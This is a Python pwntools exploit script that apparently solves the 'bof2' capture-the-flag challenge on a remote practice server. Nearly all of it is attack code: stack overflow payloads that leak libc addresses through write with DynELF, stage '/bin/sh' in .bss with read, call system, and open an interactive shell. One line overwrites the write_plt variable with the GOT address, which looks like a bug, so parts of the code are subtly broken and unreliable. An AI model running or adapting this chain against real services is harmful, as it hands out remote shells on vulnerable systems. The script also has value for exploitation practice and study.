#!/usr/bin/env python3

from pwn import *
from LibcSearcher import *

path = './bof2'
# io = process(path)
io = remote('node4.buuoj.cn', 29261)
elf = ELF(path)

write_plt   = elf.plt['write']
read_plt    = elf.plt['read']
write_plt   = elf.got['write']
main_addr   = elf.sym['main']
bss         = elf.bss()

def leak(addr):
    io.recvline()
    #payload  = b'a' * 112
    #payload += p32(write_plt)
    #payload += p32(main_addr)
    #payload += p32(1)
    #payload += p32(addr)
    #payload += p32(4)
    payload = b'a'*0x6c + b'a'*0x4 + p32(write_plt) + p32(main_addr) + p32(1) + p32(addr) + p32(4)
    io.sendline(payload)
    data = io.recv(4)
    return data

libc = DynELF(leak, elf = elf)
system_addr = libc.lookup('system', 'libc')
print(hex(system_addr))

#payload  = b'a' * 112
#payload += p32(read_plt)
#payload += p32(main_addr)
#payload += p32(0)
#payload += p32(bss)
#payload += p32(8)
payload = b'a' * 0x6c + b'a' * 0x4 + p32(read_plt) + p32(main_addr) + p32(0) + p32(bss) + p32(8)
io.sendline(payload)
io.send(b'/bin/sh\x00')

#payload  = b'a' * 112
#payload += p32(system_addr)
#payload += p32(main_addr)
#payload += p32(bss)
payload = b'a' * 0x6c + b'a' * 0x4 + p32(system_addr) + p32(main_addr) + p32(bss)
io.sendline(payload)

io.interactive()
